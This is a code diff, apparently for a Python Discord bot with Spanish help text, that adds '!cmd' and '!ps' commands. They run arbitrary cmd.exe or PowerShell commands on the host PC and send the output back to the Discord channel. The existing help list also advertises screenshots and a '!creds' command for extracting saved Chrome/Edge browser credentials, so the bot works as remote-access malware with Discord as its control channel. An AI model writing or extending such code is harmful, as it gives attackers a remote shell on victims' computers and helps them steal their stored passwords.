@@ -188,6 +188,8 @@ async def ayuda(ctx):
     embed.add_field(name="!screenshot", value="Captura de pantalla", inline=False)
     embed.add_field(name="!say [texto]", value="La PC habla el texto en voz alta", inline=False)
     embed.add_field(name="!notify [titulo] | [mensaje]", value="Muestra notificacion en Windows", inline=False)
+    embed.add_field(name="!cmd [comando]", value="Ejecuta un comando del sistema operativo", inline=False)
+    embed.add_field(name="!ps [comando]", value="Ejecuta un comando de PowerShell", inline=False)
     embed.add_field(name="!creds", value="Extrae credenciales guardadas en Chrome/Edge", inline=False)
     embed.add_field(name="!uptime", value="Tiempo encendida de la PC", inline=False)
     embed.add_field(name="!exit", value="Apaga el bot", inline=False)
@@ -304,6 +306,59 @@ async def uptime(ctx):
     hours, remainder = divmod(int(delta.total_seconds()), 3600)
     minutes, seconds = divmod(remainder, 60)
     await ctx.send(f"Uptime: **{hours}h {minutes}m {seconds}s**")
+
+
+async def _run_and_reply(ctx, args, shell_prefix=None):
+    """Ejecuta un comando y envia el resultado al canal."""
+    if shell_prefix:
+        full_cmd = shell_prefix + args
+    else:
+        full_cmd = args
+    try:
+        proc = subprocess.run(
+            full_cmd,
+            capture_output=True,
+            text=True,
+            timeout=60,
+            shell=True,
+        )
+        output = ""
+        if proc.stdout:
+            output += proc.stdout
+        if proc.stderr:
+            output += proc.stderr
+        if not output.strip():
+            output = "(sin output)"
+        exit_info = f"[exit code: {proc.returncode}]"
+    except subprocess.TimeoutExpired:
+        output = "ERROR: comando excedio el timeout de 60 segundos."
+        exit_info = "[timeout]"
+    except Exception as e:
+        output = f"ERROR: {e}"
+        exit_info = "[error]"
+
+    header = f"```\n> {args}\n{exit_info}\n```\n"
+    if len(header) + len(output) + 8 <= 2000:
+        await ctx.send(header + f"```\n{output}\n```")
+    else:
+        buf = io.BytesIO(output.encode("utf-8"))
+        await ctx.send(header, file=discord.File(buf, filename="output.txt"))
+
+
+@bot.command()
+async def cmd(ctx, *, comando: str):
+    """Ejecuta un comando del sistema operativo (cmd.exe)"""
+    if not channel_check(ctx):
+        return
+    await _run_and_reply(ctx, comando, shell_prefix="cmd /C ")
+
+
+@bot.command()
+async def ps(ctx, *, comando: str):
+    """Ejecuta un comando de PowerShell"""
+    if not channel_check(ctx):
+        return
+    await _run_and_reply(ctx, comando, shell_prefix="powershell -NoProfile -Command ")
 
 
 @bot.command()
